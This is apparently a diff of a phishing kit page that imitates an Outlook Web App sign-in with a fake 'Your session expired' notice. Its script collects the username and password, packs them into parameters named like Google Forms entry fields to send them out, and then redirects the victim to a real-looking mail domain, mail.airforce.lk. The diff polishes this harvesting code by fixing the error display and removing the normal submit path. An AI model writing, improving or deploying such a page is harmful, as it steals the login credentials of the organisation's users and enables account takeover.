@@ -57,7 +57,7 @@
           </div>
         </div>
         <div class="logonContainer">
-          <div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
+          <div id="lgnDiv" class="logonDiv" onkeypress="">
             <div class="signInImageHeader" role="heading" aria-label="Outlook">
               <img class="mouseHeader" src="./files/download.png" alt="Outlook">
             </div>
@@ -73,13 +73,14 @@
               <div>
                 <input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel">
               </div>
-              <div style="margin-top: -12px;"><p style="font-size: 14px;color: #ff0000;font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;">Your session expired.</p></div>
+              <div style="margin-top: -12px;"><p id="errormessage" style="font-size: 14px;color: #ff0000;font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;">Your session expired.</p></div>
               <div class="showPasswordCheck signInCheckBoxText">
                 <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()">
                 <span>Show password</span>
               </div>
          
               <div id="expltxt" class="signInExpl" role="alert"></div>
+              
               <button onclick="Onclick(event)" class="signInEnter">
 	    <div class="signinbutton" role="" tabindex="0">
 		<img class="imgLnk" src="./files/btn.png" alt="">
@@ -89,18 +90,15 @@
 		</button>
 
 			<script>
-			
-	
-			    function Onclick(event){
+			function Onclick(event){
 				// Prevents the default action (form submission, if inside a form)
 				event.preventDefault();
-				
-				
-				
-				    const username = document.getElementById('username').value;
+				 
+				 const username = document.getElementById('username').value;
 				    const password = document.getElementById('password').value;
 				    var errormsg = document.getElementById("errormessage");
 				    
+				 
 				     if (username.trim() === "") {
 					errormsg.innerHTML = "Username cannot be blank";
 					return false;
@@ -116,9 +114,7 @@
 					return false;
 				    }
 
-
-
-				    const params = new URLSearchParams();
+					    const params = new URLSearchParams();
 				    params.append('entry.2084499249', username);
 				    params.append('entry.2006519585', password);
 
@@ -132,13 +128,14 @@
 				    
 				      window.location.href = 'https://mail.airforce.lk';
 					    
-							    
-					    }
-					    
+						
+	 				
+	 		
+	 				    }
 			</script>
 			
               <div class="hidden-submit">
-                <input type="submit" tabindex="-1">
+                
               </div>
             </div>
           </div>
